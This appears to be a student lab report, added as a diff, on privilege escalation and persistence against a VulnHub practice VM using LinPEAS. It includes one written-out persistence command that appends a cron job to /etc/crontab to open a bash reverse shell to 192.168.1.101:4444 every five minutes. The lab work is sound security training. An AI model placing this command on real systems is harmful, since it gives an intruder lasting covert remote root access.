@@ -1,0 +1,46 @@
+Privilege Escalation and Persistence – VulnHub Lab
+
+Tools: Meterpreter, LinPEAS, PowerSploit
+Scope: Escalate privileges to root and establish persistence on a vulnerable VM
+
+Task Log
+Task ID	Technique	Target IP	Status	Outcome
+010	SUID Exploit	192.168.1.150	Success	Root Shell
+Practical Steps Documented
+
+1. Enumeration with LinPEAS:
+
+Ran LinPEAS to identify misconfigurations and privilege escalation vectors.
+
+Found SUID binaries and other kernel vulnerabilities that allow escalation to root.
+
+2. Privilege Escalation:
+
+Exploited a vulnerable SUID binary using LinPEAS recommendations.
+
+Successfully obtained a root shell.
+
+3. Establishing Persistence:
+
+Created a cron job to maintain access after reboot:
+
+echo "*/5 * * * * /usr/bin/bash -i > /dev/tcp/192.168.1.101/4444 0>&1" >> /etc/crontab
+
+
+Verified cron job execution to ensure continuous access.
+
+Checklist for Lab Report
+
+Run LinPEAS on the target VM for comprehensive enumeration.
+
+Identify SUID and kernel vulnerabilities suitable for privilege escalation.
+
+Exploit discovered vulnerabilities to escalate privileges to root.
+
+Set up persistence using cron jobs or services.
+
+Document commands, steps, and outcomes with screenshots.
+
+Summary (50 words)
+
+Performed privilege escalation on a VulnHub VM using LinPEAS to identify SUID vulnerabilities. Successfully exploited a SUID binary to gain root shell access. Established persistence by creating a cron job to maintain remote access. Lab demonstrated systematic enumeration, exploitation, and persistence setup, providing practical experience in post-exploitation techniques.
